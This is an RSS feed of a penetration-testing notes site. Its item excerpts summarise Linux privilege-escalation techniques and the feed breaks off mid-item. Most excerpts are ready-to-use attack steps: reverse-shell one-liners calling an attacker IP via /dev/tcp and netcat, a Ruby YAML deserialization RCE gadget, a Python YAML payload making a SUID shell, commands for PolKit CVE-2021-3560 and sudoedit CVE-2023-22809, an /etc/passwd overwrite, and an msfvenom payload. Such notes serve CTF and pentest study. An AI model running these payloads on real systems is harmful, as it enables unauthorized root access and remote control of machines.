<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Privilege Escalation on D0CUM3NTN4T10N</title>
    <link>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/</link>
    <description>Recent content in Privilege Escalation on D0CUM3NTN4T10N</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en</language>
    <lastBuildDate>Wed, 17 Jan 2024 11:38:09 +0530</lastBuildDate>
    <atom:link href="https://documentnation.github.io/docs/hdks/linux/privilege-escalation/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>Sudo Privilege Escalation by Overriding Shared Library</title>
      <link>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/sudo/sudo-privilege-escalation-by-overriding-shared-library/</link>
      <pubDate>Thu, 26 Oct 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/sudo/sudo-privilege-escalation-by-overriding-shared-library/</guid>
      <description>LD_PRELOAD, LD_LIBRARY_PATH Overwriting linkInvestigation linkCheck sudo commands.&#xA;sudo -l The below is the output example.&#xA;env_keep&amp;#43;=LD_PRELOAD (ALL : ALL) NOPASSWD: somecmd If we find the sudo command keeps LD_PRELOAD environment, we can overwrite this variable to load our custome shared object and escalate the privileges.&#xA;Also, we can replace the LD_PRELOAD with LD_LIBRARY_PATH.&#xA;By the way, to list shared libraries required by the executable, use ldd command.&#xA;ldd somecmd Exploitation linkFirst off, create exploit.</description>
    </item>
    <item>
      <title>Shared Library Hijacking</title>
      <link>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/shared-library-hijacking/</link>
      <pubDate>Wed, 13 Sep 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/shared-library-hijacking/</guid>
      <description>Investigation linkWhen we find the binary file as setuid or sudo command, check the strings of the binary file.&#xA;strings ./example strace ./example gdb ./example ... foo.so ... If the binary file uses a shared library (e.g. foo.so) and this library can be modified, we can update it and get a root shell.&#xA;find / -type f -name &amp;#34;foo.so&amp;#34; 2&amp;gt;/dev/null ls -al /path/to/foo.so drwxrwxrwx 1 user user 64 Dec 15 09:13 foo.</description>
    </item>
    <item>
      <title>PolKit Privilege Escalation</title>
      <link>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/polkit-privilege-escalation/</link>
      <pubDate>Mon, 24 Jul 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/polkit-privilege-escalation/</guid>
      <description>CVE-2021-3560 link1. Send a dbus message to create a new user linkCreate a new user by sending a dbus message.&#xA;# string:tester: The new user named &amp;#34;tester&amp;#34;. # string:&amp;#34;Tester Account&amp;#34;: The description of the new user. # int32:1: sudo group dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:tester string:&amp;#34;Tester Account&amp;#34; int32:1 &amp;amp; sleep 0.005s; kill $! Then check the new user ID (uid).&#xA;id tester uid=1000(tester) gid=1000(tester) groups=1000(tester),27(sudo) 2. Generate a new password hash link # -6: SHA512 openssl passwd -6 password123 Copy the output hash.</description>
    </item>
    <item>
      <title>Sudo Git Privilege Escalation</title>
      <link>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/sudo/sudo-git-privilege-escalation/</link>
      <pubDate>Sun, 23 Jul 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/sudo/sudo-git-privilege-escalation/</guid>
      <description>Git Add/Commit link sudo /usr/bin/git --git-dir=/opt/example/.git --work-tree=/opt/example add -A sudo /usr/bin/git --git-dir=/opt/example/.git --work-tree=/opt/example commit -m &amp;#34;commit&amp;#34; If we can commit the git repository as root, we may be able to escalate privileges.&#xA;Exploitation link Create a Payload echo &amp;#39;bash -c &amp;#34;bash -i &amp;gt;&amp;amp; /dev/tcp/10.0.0.1/4444 0&amp;gt;&amp;amp;1&amp;#34;&amp;#39; &amp;gt; /tmp/revshell chmod &amp;#43;x /tmp/revshell Set Git Config # Go to the git repository cd /opt/example git init echo &amp;#39;*.php filter=indent&amp;#39; &amp;gt; .git/info/attributes git config filter.</description>
    </item>
    <item>
      <title>Sudo Systemctl Privilege Escalation</title>
      <link>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/sudo/sudo-systemctl-privilege-escalation/</link>
      <pubDate>Wed, 12 Jul 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/sudo/sudo-systemctl-privilege-escalation/</guid>
      <description>Modify Configurations link sudo -l (ALL) NOPASSWD: systemctl If we can run &amp;ldquo;systemctl&amp;rdquo; command as root, and we can edit the config file, then we might be a root user.&#xA;1. Update the Config File linkWe need to insert the payload for reverse shell to get a root shell into the /etc/systemd/system/example.service.&#xA;[Unit] This is an example service. [Service] Type=simple User=root ExecStart=/bin/bash -c &amp;#39;bash -i &amp;gt;&amp;amp; /dev/tcp/&amp;lt;local-ip&amp;gt;/4444 0&amp;gt;&amp;amp;1&amp;#39; [Install] WantedBy=multi-user.target Replace “&amp;lt;local-ip&amp;gt;” with your local ip address.</description>
    </item>
    <item>
      <title>Buffer Overflow Privilege Escalation</title>
      <link>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/buffer-overflow-privilege-escalation/</link>
      <pubDate>Wed, 05 Jul 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/buffer-overflow-privilege-escalation/</guid>
      <description>Baron Samedit (Heap Buffer Overflow) CVE-2021-3156 link1. Check Vulnerability to Overwrite Heap Buffer in Target Machine link sudoedit -s &amp;#39;\&amp;#39; $(python3 -c &amp;#39;print(&amp;#34;A&amp;#34;*1000)&amp;#39;) malloc(): invalid size (unsorted) Aborted 2. Proof of Concept linkThere are various PoC online.&#xA;https://github.com/lockedbyte/CVE-Exploits/tree/master/CVE-2021-3156. https://github.com/blasty/CVE-2021-3156 Pwfeedback link1. Check Enabling the Pwfeedback in /etc/sudoers linkIf so, when running sudo command and inputting password, asterisk will be displayed.&#xA;You can make it the buffer overflow.&#xA;cat /etc/sudoers # ------------------------------------------- .</description>
    </item>
    <item>
      <title>Rust Privilege Escalation</title>
      <link>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/rust-privilege-escalation/</link>
      <pubDate>Tue, 27 Jun 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/rust-privilege-escalation/</guid>
      <description>Reverse Shell linkReference: https://github.com/LukeDSchenk/rust-backdoors/blob/master/reverse-shell/src/main.rs&#xA;We can create a binary or module to reverse shell.&#xA;cd /path/to/rust/project/src vim lib.rs (In vim editor, insert a reverse shell code into a file) cargo build </description>
    </item>
    <item>
      <title>Gnuplot Privilege Escalation</title>
      <link>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/gnuplot-privilege-escalation/</link>
      <pubDate>Mon, 19 Jun 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/gnuplot-privilege-escalation/</guid>
      <description>Command Execution linkThe script file of gnuplot can be used to execute system commands as below.&#xA;gnuplot test.plt Contents of the .plt is like the following.&#xA;system &amp;#34;whoami&amp;#34; # Reverse shell system &amp;#34;bash -c &amp;#39;bash -i &amp;gt;&amp;amp; /dev/tcp/10.0.0.1/4444 0&amp;gt;&amp;amp;1&amp;#39;&amp;#34; </description>
    </item>
    <item>
      <title>Pip Download Code Execution</title>
      <link>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/pip-download-code-execution/</link>
      <pubDate>Thu, 27 Apr 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/pip-download-code-execution/</guid>
      <description>Exploitation link1. Create Malicious Python Package linkReference: https://github.com/wunderwuzzi23/this_is_fine_wuzzi&#xA;Assume the package named &amp;ldquo;exploitpy&amp;rdquo;.&#xA;We need to create &amp;ldquo;setup.py&amp;rdquo; in the project root, and &amp;quot;init.py&amp;quot;, &amp;ldquo;main.py&amp;rdquo; in src directory.&#xA;mkdir exploitpy cd exploitpy touch setup.py mkdir src touch src/__init__.py echo &amp;#39;print(&amp;#34;hello&amp;#34;)&amp;#39; &amp;gt; src/main.py Below is the content of the &amp;ldquo;setup.py&amp;rdquo;.&#xA;The arbitrary code is injected in the “RunCommand” method. It is executed when pip download command.&#xA;# setup.py from setuptools import setup, find_packages from setuptools.</description>
    </item>
    <item>
      <title>SSSD Privilege Escalation</title>
      <link>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/sssd-privilege-escalation/</link>
      <pubDate>Sun, 16 Apr 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/sssd-privilege-escalation/</guid>
      <description>Find Credentials link ls -la /var/lib/sss/ # Find credentials # If we find the hash, crack it using John or Hashcat. strings /var/lib/sss/db/example.ldb </description>
    </item>
    <item>
      <title>Python Eval Code Execution</title>
      <link>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/python-eval-code-execution/</link>
      <pubDate>Tue, 11 Apr 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/python-eval-code-execution/</guid>
      <description>Investigation link eval(text) eval(f&amp;#34;5 &amp;#43; {num}&amp;#34;) If the Python script allows us to input some value to the &amp;ldquo;text&amp;rdquo; variable, we can inject arbitrary code.&#xA;Arbitrary Code Execution linkMost of the time, we need to bypass another expression to execute our desired command.&#xA;__import__(&amp;#39;os&amp;#39;).system(&amp;#39;id&amp;#39;) &amp;lt;!-- Bypass another expression in eval --&amp;gt; ),__import__(&amp;#39;os&amp;#39;).system(&amp;#39;id&amp;#39;) &amp;#39;),__import__(&amp;#39;os&amp;#39;).system(&amp;#39;id&amp;#39;) },__import__(&amp;#39;os&amp;#39;).system(&amp;#39;id&amp;#39;) ),__import__(&amp;#39;os&amp;#39;).system(&amp;#39;id&amp;#39;)# Reverse Shell link __import__(&amp;#39;os&amp;#39;).system(&amp;#39;bash -c &amp;#34;bash -i &amp;gt;&amp;amp; /dev/tcp/10.0.0.1/4444 0&amp;gt;&amp;amp;1&amp;#34;&amp;#39;) </description>
    </item>
    <item>
      <title>Tar Wildcard Injection PrivEsc</title>
      <link>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/tar-wildcard-injection-privesc/</link>
      <pubDate>Sat, 01 Apr 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/tar-wildcard-injection-privesc/</guid>
      <description>Investigation linkFor example, below command can be executed as root.&#xA;sudo -l (root) NOPASSWD: /opt/backup/baskup.sh Check If the File Contains Tar Command with Wildcards linkWe need to check the content in the file.&#xA;cat /opt/backup/backup.sh # -cf: create an archived file tar -cf backup.tar * The above tar command means that it creates an arvhived file from any input file because it passes wildcard (*).&#xA;Exploitation linkNow create a payload for privilege escalation.</description>
    </item>
    <item>
      <title>Ghidra Debug Mode RCE</title>
      <link>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/ghidra-debug-mode-rce/</link>
      <pubDate>Fri, 31 Mar 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/ghidra-debug-mode-rce/</guid>
      <description>Exploitation link jdb -attach 127.0.0.1:18001 &amp;gt; classpath &amp;gt; classes Log4j2-TF-4-Scheduled-1[1] stop in org.apache.logging.log4j.core.util.WatchManager$WatchRunnable.run() Log4j2-TF-4-Scheduled-1[1] print new java.lang.Runtime().exec(&amp;#34;nc 10.0.0.1 4444 -e /bin/sh&amp;#34;) </description>
    </item>
    <item>
      <title>Python Privilege Escalation</title>
      <link>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/python-privilege-escalation/</link>
      <pubDate>Wed, 29 Mar 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/python-privilege-escalation/</guid>
      <description>Sudo PrivEsc linkReplace with Arbitrary Script link sudo -l (root) NOPASSWD: /usr/bin/python3 /home/&amp;lt;username&amp;gt;/example.py If the python script is under the current user&amp;rsquo;s home directory, we can remove the script and create the new one with the same name.&#xA;rm -rf /home/&amp;lt;username&amp;gt;/example.py touch /home/&amp;lt;username&amp;gt;/example.py We can insert arbitrary code in the new script. For example,&#xA;import os;os.system(&amp;#39;/bin/bash&amp;#39;) Module Hijacking linkAssume the python script can be executed as root with SETENV,NOPASSWD.&#xA;For example,</description>
    </item>
    <item>
      <title>Sudoedit Privilege Escalation</title>
      <link>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/sudo/sudoedit-privilege-escalation/</link>
      <pubDate>Wed, 29 Mar 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/sudo/sudoedit-privilege-escalation/</guid>
      <description>Investigation link sudo -l (root) sudoedit /opt/example.txt If we can execute sudoedit command as root, we might be able to escalate the privileges with some version.&#xA;Exploitation (CVE-2023-22809) link export EDITOR=&amp;#34;vim -- /etc/sudoers&amp;#34; sudoedit /opt/example.txt In vim editor, add the following line in /etc/sudoers.&#xA;Assume the current username is “john”&#xA;john ALL=(ALL:ALL) ALL After that, we can escalate to root privilege.&#xA;sudo su root </description>
    </item>
    <item>
      <title>irb (Interactive Ruby Shell) Privilege Escalation</title>
      <link>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/irb-privilege-escalation/</link>
      <pubDate>Tue, 28 Mar 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/irb-privilege-escalation/</guid>
      <description>Exploitation link irb # #q!: Define a string literal &amp;gt; exec %q!whoami! &amp;gt; exec %q!cp /bin/bash /tmp/bash; chmod &amp;#43;s /tmp/bash! &amp;gt; exec %q!bash -c &amp;#34;bash -i &amp;gt;&amp;amp; /dev/tcp/10.0.0.1/4444 0&amp;gt;&amp;amp;1&amp;#34;! </description>
    </item>
    <item>
      <title>Ruby Privilege Escalation</title>
      <link>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/ruby-privilege-escalation/</link>
      <pubDate>Tue, 28 Mar 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/ruby-privilege-escalation/</guid>
      <description>Remote Code Execution with YAML linkCheck if the current user could run the ruby script as root privilege.&#xA;(root) NOPASSWD: /usr/bin/ruby sample.rb If the sample.rb contains the “File.read(’sample.yml’)”, modify the YAML file as follow:&#xA;--- - !ruby/object:Gem::Installer i: x - !ruby/object:Gem::SpecFetcher i: y - !ruby/object:Gem::Requirement requirements: !ruby/object:Gem::Package::TarReader io: &amp;amp;1 !ruby/object:Net::BufferedIO io: &amp;amp;1 !ruby/object:Gem::Package::TarReader::Entry read: 0 header: &amp;#34;abc&amp;#34; debug_output: &amp;amp;1 !ruby/object:Net::WriteAdapter socket: &amp;amp;1 !ruby/object:Gem::RequestSet sets: !ruby/object:Net::WriteAdapter socket: !ruby/module &amp;#39;Kernel&amp;#39; method_id: :system git_set: &amp;#34;bash -c &amp;#39;bash -i &amp;gt;&amp;amp; /dev/tcp/&amp;lt;local-ip&amp;gt;/&amp;lt;local-port&amp;gt; 0&amp;gt;&amp;amp;1&amp;#39;&amp;#34; method_id: :resolve Then start listener in local machine.</description>
    </item>
    <item>
      <title>Python Jails Escape</title>
      <link>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/python-jails-escape/</link>
      <pubDate>Sun, 26 Mar 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/python-jails-escape/</guid>
      <description>If we faced the Python script as follow, we cannot use common modules used for escalating privileges (&amp;ldquo;os&amp;rdquo;, &amp;ldquo;system&amp;rdquo;, etc.).&#xA;It appeared in Newbie CTF 2019.&#xA;#! /usr/bin/python3 def main(): text = input(&amp;#39;&amp;gt;&amp;gt; &amp;#39;) for keyword in [&amp;#39;eval&amp;#39;, &amp;#39;exec&amp;#39;, &amp;#39;import&amp;#39;, &amp;#39;open&amp;#39;, &amp;#39;os&amp;#39;, &amp;#39;read&amp;#39;, &amp;#39;system&amp;#39;, &amp;#39;write&amp;#39;]: if keyword in text: print(&amp;#34;No!!!&amp;#34;) return else: exec(text) if __name__ == &amp;#34;__main__&amp;#34;: main() We need to modify module names to allow us to execute them.</description>
    </item>
    <item>
      <title>Python Yaml Privilege Escalation</title>
      <link>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/python-yaml-privilege-escalation/</link>
      <pubDate>Sun, 26 Mar 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/python-yaml-privilege-escalation/</guid>
      <description>Investigation link import yaml filename = &amp;#34;example.yml&amp;#34; yaml.load() Payloads link import yaml from yaml import Loader, UnsafeLoader data = b&amp;#39;!!python/object/new:os.system [&amp;#34;cp `which bash` /tmp/bash;chown root /tmp/bash;chmod u&amp;#43;sx /tmp/bash&amp;#34;]&amp;#39; yaml.load(data) yaml.load(data, Loader=Loader) yaml.load(data, Loader=UnsafeLoader) yaml.load_all(data) yaml.load_all(data, Loader=Loader) yaml.load_all(data, Loader=UnsafeLoader) yaml.unsafe_load(data) Now execute the bash in privilege mode.&#xA;/tmp/bash -p Reverse Shell linkStart a listener in local machine.&#xA;nc -lvnp 1234 Then execute Python script that contains the following YAML code as root.</description>
    </item>
    <item>
      <title>Bash eq Privilege Escalation</title>
      <link>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/bash-eq-privilege-escalation/</link>
      <pubDate>Thu, 16 Mar 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/bash-eq-privilege-escalation/</guid>
      <description>Investigation linkPlease see this post for details.&#xA;sudo -l (root) /bin/bash /opt/example.sh If we can execute above command as root, and the /opt/example.sh contains the numeric comparison such as [[ $var -eq 42 ]], we can execute arbitrary command.&#xA;#!/bin/bash read -rp &amp;#34;Enter guess: &amp;#34; num if [[ $num -eq 42 ]] then echo &amp;#34;Correct&amp;#34; else echo &amp;#34;Wrong&amp;#34; fi To execute arbitrary command, answer this question as below.&#xA;sudo /bin/bash /opt/example.</description>
    </item>
    <item>
      <title>Ansible Playbook Privilege Escalation</title>
      <link>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/ansible-playbook-privilege-escalation/</link>
      <pubDate>Tue, 14 Mar 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/ansible-playbook-privilege-escalation/</guid>
      <description>PrivEsc with Tasks linkFirst off, check the content of playbook in /opt/ansible/playbooks.&#xA;For instance, a file named “httpd.yaml”.&#xA;- name: Install and configure Apache ... roles: - role: geerlingguy.apache tasks: - name: configure firewall firewalld: ... Next, check the content of configure files in /opt/ansible/roles/geerlingguy.apache/tasks.&#xA;And add the exploitable file in this.&#xA;For example, a file named “shell.yml”.&#xA;- hosts: localhost tasks: - name: RShell command: sudo bash /tmp/root.sh Create a exploit for reverse shell.</description>
    </item>
    <item>
      <title>Chrome Remote Debugger Pentesting</title>
      <link>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/chrome-remote-debugger-pentesting/</link>
      <pubDate>Sat, 11 Mar 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/chrome-remote-debugger-pentesting/</guid>
      <description>Investigation link /usr/bin/google-chrome --remote-debugging-port=12345 If the target system is running Google Chrome Debugger with specific port, we can port forward and may be able to retrieve sensitive data in browser debugging mode.&#xA;Exploitation link1. Port Forwarding linkFirst off, start port forwarding in local machine.&#xA;ssh -L 12345:127.0.0.1:12345 remote-user@example.com 2. Configure Network Targets in Chrome linkAssume the chrome debugger is running on port 12345.&#xA;Open Chrome browser and input the following string in URL bar at the top of the window.</description>
    </item>
    <item>
      <title>OpenSSL Privilege Escalation</title>
      <link>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/openssl-privilege-escalation/</link>
      <pubDate>Thu, 09 Mar 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/openssl-privilege-escalation/</guid>
      <description>Privilege Escalation (SUID) linkReference: https://chaudhary1337.github.io/p/how-to-openssl-cap_setuid-ep-privesc-exploit/&#xA;1. Get Capabilities linkChack capabilities in the target machine.&#xA;# -r: recursive getcap -r / 2&amp;gt;/dev/null If you see the openssl has the capability set as below, you can successfully exploit it.&#xA;/usr/bin/openssl = cap_setuid&amp;#43;ep 2. Create the Exploit in C linkIn local machine, you need to have “libssl-dev” to use the header file named “openssl/engine.h” in the exploit.&#xA;If you don&amp;rsquo;t have it yet, install it.</description>
    </item>
    <item>
      <title>Apache Conf Privilege Escalation</title>
      <link>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/apache-conf-privilege-escalation/</link>
      <pubDate>Tue, 07 Mar 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/apache-conf-privilege-escalation/</guid>
      <description>Investigation link ls -al /etc/apache2 -rwxrwxrwx 1 root root 7094 NOV 7 2023 apache2.conf If we can modify the apache configuration file, we can update the web owner (www-data) to arbitrary user.&#xA;Exploitation link1. Update Apache.Conf linkFirst modify “apache.conf” file to change the web user with new one.&#xA;# These need to be set in /etc/apache2/envvars User www-data Group www-data 2. Insert Reverse Shell Script linkIn the web directory (e.g. /var/www/html), create the script to reverse shell.</description>
    </item>
    <item>
      <title>Sudo Tee Privilege Escalation</title>
      <link>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/sudo/sudo-tee-privilege-escalation/</link>
      <pubDate>Sun, 26 Feb 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/sudo/sudo-tee-privilege-escalation/</guid>
      <description>Investigation link (root) NOPASSWD: /usr/bin/tee If we can execute tee command as root, we can escalate to privilege.&#xA;Exploitation link1. Create a New Password for New User linkAssume the new username is &amp;ldquo;tester&amp;rdquo;.&#xA;# -1: MD5 algorithm # -salt: Use privided salt -&amp;gt; The new username here openssl passwd -1 -salt &amp;#34;tester&amp;#34; &amp;#34;password123&amp;#34; # Output: $1$tester$LvsygQ2GEt7VUJQEqhMLf/ Copy the output password.&#xA;2. Write New Line with Tee linkPaste the password in printf and overwrite /etc/passwd using tee command.</description>
    </item>
    <item>
      <title>Sudo OpenVPN Privilege Escalation</title>
      <link>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/sudo/sudo-openvpn-privilege-escalation/</link>
      <pubDate>Fri, 17 Feb 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/sudo/sudo-openvpn-privilege-escalation/</guid>
      <description>Investigation link (root) /usr/sbin/openvpn /opt/example.ovpn If we can execute openvpn command as root and we have a permission of editing the .ovpn file, we can escalate to privilege.&#xA;Exploitation link1. Create a Payload linkFirst create a shell script to reverse shell. For example, create /tmp/shell.sh.&#xA;Replace &amp;lt;local-ip&amp;gt; with your local ip address.&#xA;#!/bin/bash bash -i &amp;gt;&amp;amp; /dev/tcp/&amp;lt;local-ip&amp;gt;/4444 0&amp;gt;&amp;amp;1 Then change the file permission so that root can execute this script.</description>
    </item>
    <item>
      <title>Update-Motd Privilege Escalation</title>
      <link>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/update-motd-privilege-escalation/</link>
      <pubDate>Fri, 17 Feb 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/update-motd-privilege-escalation/</guid>
      <description>Investigation link ls -al /etc/update-motd.d/ If we have permission to modify files in this directory, we can inject arbitrary code and execute when logging in.&#xA;Exploitation linkRun the following code to copy bash binary and give suid to this file.&#xA;Replace &amp;lt;username&amp;gt; with your current user name.&#xA;echo &amp;#34;cp /bin/bash /home/&amp;lt;username&amp;gt;/bash &amp;amp;&amp;amp; chmod u&amp;#43;s /home/&amp;lt;username&amp;gt;/bash&amp;#34; &amp;gt;&amp;gt; /etc/update-motd.d/00-header After that, log out and log in again with SSH. The above script should be executed.</description>
    </item>
    <item>
      <title>Sudo Umount Privilege Escalation</title>
      <link>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/sudo/sudo-umount-privilege-escalation/</link>
      <pubDate>Wed, 15 Feb 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/sudo/sudo-umount-privilege-escalation/</guid>
      <description>Investigation link sudo -l (root) NOPASSWD: /bin/umount If we can execute umount command as root, we can escalate to privilege.&#xA;Exploitation linkIn target machine, check what directory is mounted.&#xA;cat /etc/fstab showmount -e localhost Assume the /opt/example folder is mounted.&#xA;If we unmount this folder, original files, that existed before the directory is mounted, may appear.&#xA;sudo /bin/umount /opt/example ls -al /opt/example </description>
    </item>
    <item>
      <title>Sudo Java Privilege Escalation</title>
      <link>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/sudo/sudo-java-privilege-escalation/</link>
      <pubDate>Tue, 14 Feb 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/sudo/sudo-java-privilege-escalation/</guid>
      <description>Investigation link sudo -l (root) /usr/bin/java -jar *.jar If we can execute java command with arbitrary .jar file as root, we can escalate to privileges.&#xA;Exploitation link1. Create a JAR File linkFirst, create a custom jar file in local machine.&#xA;Replace &amp;lt;local-ip&amp;gt; with your local ip address.&#xA;msfvenom -p java/shell_reverse_tcp LHOST=&amp;lt;local-ip&amp;gt; LPORT=4444 -f jar -o shell.jar Then transfer the file to remote machine.&#xA;2. Reverse Shell linkIn local machine, start a listener.</description>
    </item>
    <item>
      <title>Sudo Service Privilege Escalation</title>
      <link>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/sudo/sudo-service-privilege-escalation/</link>
      <pubDate>Sat, 11 Feb 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/sudo/sudo-service-privilege-escalation/</guid>
      <description>Investigation link sudo -l (ALL : ALL) /usr/sbin/service vsftpd restart If we can execute service command as root, we may be able to escalate to root privilege.&#xA;Exploitation link1. Find the Location of the Config File linkAssume we can operate the vsftpd service as root. Firse off, find the service config file for vsftpd.&#xA;find / -name &amp;#34;*vsftpd*&amp;#34; For instance, we&amp;rsquo;ll find the location as below.&#xA;/lib/systemd/system/vsftpd.service /etc/systemd/system/multi-user.target.wants/vsftpd.service When getting the locations, the next thing to do is to check the permission.</description>
    </item>
    <item>
      <title>Snapd Privilege Escalation</title>
      <link>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/snapd-privilege-escalation/</link>
      <pubDate>Sun, 05 Feb 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/snapd-privilege-escalation/</guid>
      <description>dirty_sock (CVE-2019-7304) Version &amp;lt; 2.37 linkReference: https://www.exploit-db.com/exploits/46361</description>
    </item>
    <item>
      <title>Sudo ClamAV Privilege Escalation</title>
      <link>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/sudo/sudo-clamav-privilege-escalation/</link>
      <pubDate>Sun, 05 Feb 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/sudo/sudo-clamav-privilege-escalation/</guid>
      <description>Investigation linkIf we can execute “clamscan” command as root as below,&#xA;sudo /usr/bin/clamscan /etc/shadow --copy=/tmp/results we can read sensitive files by applying the custom yara rule.&#xA;Exploitation link1. Create a Yara Rule linkFirst off, check the location in which the yara file can be created.&#xA;find / -name &amp;#34;clam*&amp;#34; 2&amp;gt;/dev/null For instance, assume we can create the yara file under /var/lib/clamav/.&#xA;Create the yara rule in there.&#xA;Assume we want to read /etc/shadow, so specify the string “root” because the /etc/shadow contains “root” user name.</description>
    </item>
    <item>
      <title>Sudo Dstat Privilege Escalation</title>
      <link>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/sudo/sudo-dstat-privilege-escalation/</link>
      <pubDate>Sun, 05 Feb 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/sudo/sudo-dstat-privilege-escalation/</guid>
      <description>dstat is a versatile tool for generating system resource statistics.&#xA;It allows users to create a custom plugin and execute by adding option e.g. dstat --myplugin.&#xA;Investigation link sudo -l (ALL) NOPASSWD: /usr/bin/dstat If we can execute &amp;ldquo;dstat&amp;rdquo; command as root, we can gain access to privileges by using our malicious plugin.&#xA;Exploitation link1. Create a New Dstat Plugin linkFirst off, find locate the &amp;ldquo;dstat&amp;rdquo; directory.&#xA;find / -type d -name dstat 2&amp;gt;/dev/null Assume the location of dstat is “/usr/local/share/dstat”.</description>
    </item>
    <item>
      <title>Sudo Exiftool Privilege Escalation</title>
      <link>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/sudo/sudo-exiftool-privilege-escalation/</link>
      <pubDate>Sun, 05 Feb 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/sudo/sudo-exiftool-privilege-escalation/</guid>
